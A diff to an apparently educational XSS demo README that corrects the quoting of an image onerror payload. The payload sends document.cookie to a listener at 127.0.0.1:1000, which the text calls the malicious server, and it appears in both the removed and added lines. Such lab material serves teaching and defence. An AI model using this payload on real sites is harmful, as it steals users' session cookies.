@@ -83,7 +83,7 @@ Usage:
 
 ## Execution of XSS through image loading
 * Go to the images tab of the website
-* Add ```' onerror=document.location='http://127.0.0.1:1000/?c='+document.cookie;class=``` after the `#` symbol
+* Add ```' onerror="document.location='http://127.0.0.1:1000/?c='+document.cookie;"class=``` after the `#` symbol
 * It will cause the xss script to execute and the cookie will be obtained by the malicious server
 
 # Protection mechanisms
